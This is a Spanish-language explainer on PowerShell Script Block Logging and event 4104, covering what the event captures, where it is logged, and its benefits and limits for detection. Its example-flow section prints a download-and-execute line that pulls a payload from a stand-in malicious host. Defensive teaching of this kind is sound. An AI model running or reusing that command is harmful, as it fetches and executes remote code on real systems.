
### 1️⃣ ¿Qué es Script Block Logging?

* Es una característica de **PowerShell** (desde la versión 5.0) que permite **registrar todo el código que PowerShell va a ejecutar**, incluso si está ofuscado o generado dinámicamente.
* Su objetivo principal es **seguridad y auditoría**, para detectar scripts maliciosos que usan técnicas de ofuscación para evadir detección.

---

### 2️⃣ Evento 4104 en detalle

* **Categoría:** PowerShell / Windows PowerShell
* **ID de evento:** 4104
* **Qué captura:** El **código completo** de los bloques de script antes de ejecutarse.

  * Esto incluye scripts ofuscados, como cadenas codificadas en Base64 o comandos “inline” dentro de `Invoke-Expression`.
* **Dónde se guarda:** En el **Visor de eventos**, bajo:

  ```
  Applications and Services Logs → Microsoft → Windows → PowerShell → Operational
  ```

---

### 3️⃣ Ejemplo de flujo

1. Un script malicioso se encuentra en la máquina.
2. El atacante intenta ejecutarlo con PowerShell, por ejemplo:

   ```powershell
   iex (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')
   ```
3. **Script Block Logging** intercepta el bloque de script **antes de la ejecución**.
4. Se registra un evento 4104 que contiene:

   * Código exacto que se va a ejecutar.
   * Información sobre el usuario que ejecuta el script.
   * Detalles sobre la línea y módulo de PowerShell.

---

### 4️⃣ Beneficios y limitaciones

**Beneficios:**

* Permite detectar **ataques ofuscados** que de otra manera pasarían desapercibidos.
* Útil para herramientas de SIEM como **Microsoft Sentinel**, porque puedes alertar sobre patrones sospechosos en el código ejecutado.

**Limitaciones:**

* No previene la ejecución; solo **registra lo que pasa**.
* Puede generar **muchos eventos**, lo que aumenta el volumen de logs.
* Si un script genera código dinámico en tiempo de ejecución, se registrará **solo el bloque final que PowerShell interpreta**, no la intención original del atacante.
